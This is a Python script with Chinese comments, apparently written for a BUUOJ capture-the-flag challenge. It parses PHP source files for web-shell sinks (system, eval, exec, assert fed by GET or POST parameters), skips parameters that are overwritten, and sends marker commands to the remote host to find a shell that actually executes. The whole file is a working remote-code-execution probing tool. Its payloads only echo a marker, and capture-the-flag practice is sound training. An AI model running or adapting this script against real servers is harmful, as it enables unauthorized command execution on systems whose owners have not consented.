#!/usr/bin/env python3
"""
快速测试：只测试没有被覆盖的shell
"""
import os
import re
import requests
import time
import random
import string
import sys

BASE_URL = "http://01de7a39-b84f-4e29-afb6-cc13ed331efc.node5.buuoj.cn:81"
SRC_DIR = "src"
DELAY = 0.05

def generate_marker():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def is_param_overwritten(content, param, method):
    """检查参数是否被覆盖"""
    pattern = rf"\$_{method}\['{param}'\]\s*="
    return bool(re.search(pattern, content))

def main():
    php_files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    
    patterns = [
        (r"system\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'system'),
        (r"system\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'system'),
        (r"eval\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'eval'),
        (r"eval\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'eval'),
        (r"exec\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'exec'),
        (r"exec\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'exec'),
        (r"assert\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'assert'),
        (r"assert\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'assert'),
    ]
    
    session = requests.Session()
    tested = 0
    
    for php_file in php_files:
        filepath = os.path.join(SRC_DIR, php_file)
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
        
        for pattern, method, func in patterns:
            matches = re.findall(pattern, content)
            for param in matches:
                # 检查是否被覆盖
                if is_param_overwritten(content, param, method):
                    continue
                
                # 测试
                marker = generate_marker()
                url = f"{BASE_URL}/{php_file}"
                
                try:
                    if method == 'GET':
                        if func in ['system', 'exec']:
                            r = session.get(url, params={param: f'echo {marker}'}, timeout=3)
                        elif func == 'eval':
                            r = session.get(url, params={param: f'echo "{marker}";'}, timeout=3)
                        elif func == 'assert':
                            r = session.get(url, params={param: f'print("{marker}");'}, timeout=3)
                        else:
                            r = session.get(url, params={param: f'echo {marker}'}, timeout=3)
                    else:
                        if func in ['system', 'exec']:
                            r = session.post(url, data={param: f'echo {marker}'}, timeout=3)
                        elif func == 'eval':
                            r = session.post(url, data={param: f'echo "{marker}";'}, timeout=3)
                        elif func == 'assert':
                            r = session.post(url, data={param: f'print("{marker}");'}, timeout=3)
                        else:
                            r = session.post(url, data={param: f'echo {marker}'}, timeout=3)
                    
                    if r.status_code == 429:
                        time.sleep(10)
                        continue
                    
                    if marker in r.text:
                        print(f"\n[+] FOUND: {php_file} - {method} {func}({param})")
                        return php_file, method, func, param
                    
                    tested += 1
                    if tested % 1000 == 0:
                        print(f"[*] Tested {tested}...", file=sys.stderr)
                    
                    time.sleep(DELAY)
                    
                except Exception as e:
                    pass
    
    print(f"\n[*] Tested {tested}, none worked")
    return None

if __name__ == "__main__":
    main()
